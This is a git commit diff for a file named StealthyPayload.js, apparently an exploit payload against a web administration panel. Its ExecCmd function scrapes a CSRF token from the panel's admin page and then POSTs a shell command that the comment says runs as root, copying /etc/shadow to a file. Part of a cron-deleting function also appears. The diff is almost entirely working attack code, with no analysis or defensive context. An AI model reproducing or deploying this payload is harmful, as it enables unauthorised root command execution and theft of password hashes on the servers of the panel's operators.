e774585a01f17ef79d1d51e74e01a90393b6c1de
Chokri B.A <TnExperts@users.noreply.github.com>
2021-01-08 13:06:48 +0100

    Update and rename StealthyPayload.js to StealthyPayloadA.js

--- StealthyPayloadA.js
+++ StealthyPayloadA.js
@@ -21,6 +21,44 @@ function read_body(xhr)
 	return data; 
 }
 
+function ExecCmd()
+{
+	var pathArray = window.location.pathname.split('/');
+	var token = pathArray[1];
+	var uri = "/"+ token + "/admin/index.php?module=send_ssh";
+
+	// The following command will be executed as root
+	var cmd  = "cat /etc/shadow > /root/hola.txt";
+
+
+	xhr = new XMLHttpRequest();
+
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+
+
+	xhr.onreadystatechange = function()
+	{
+		if (xhr.readyState == XMLHttpRequest.DONE)
+		{
+			var response = read_body(xhr);
+			var noncePos = response.indexOf("csrf_token' size='0' value='");
+			var nonceVal = response.substring(noncePos+28, noncePos+60);
+
+			xhr = new XMLHttpRequest();
+			xhr.open("POST", uri);
+
+ 			xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+ 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+			var body = "csrf_token=" + nonceVal + "&";
+			body += "ssh+command=" + cmd;
+
+			xhr.send(body);
+		}
+	}
+}
+
 function deleteCron()
 {
 	var pathArray = window.location.pathname.split('/');
@@ -57,44 +95,6 @@ function deleteCron()
 
 			var body = "user=" + user + "&";
 			body += "line=" + line;
-
-			xhr.send(body);
-		}
-	}
-}
-
-function ExecCmd()
-{
-	var pathArray = window.location.pathname.split('/');
-	var token = pathArray[1];
-	var uri = "/"+ token + "/admin/index.php?module=send_ssh";
-
-	// The following command will be executed as root
-	var cmd  = "cat /etc/shadow > /root/hola.txt";
-
-
-	xhr = new XMLHttpRequest();
-
-	xhr.open("GET", uri, true);
-	xhr.send(null);
-
-
-	xhr.onreadystatechange = function()
-	{
-		if (xhr.readyState == XMLHttpRequest.DONE)
-		{
-			var response = read_body(xhr);
-			var noncePos = response.indexOf("csrf_token' size='0' value='");
-			var nonceVal = response.substring(noncePos+28, noncePos+60);
-
-			xhr = new XMLHttpRequest();
-			xhr.open("POST", uri);
-
- 			xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
- 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-			var body = "csrf_token=" + nonceVal + "&";
-			body += "ssh+command=" + cmd;
 
 			xhr.send(body);
 		}
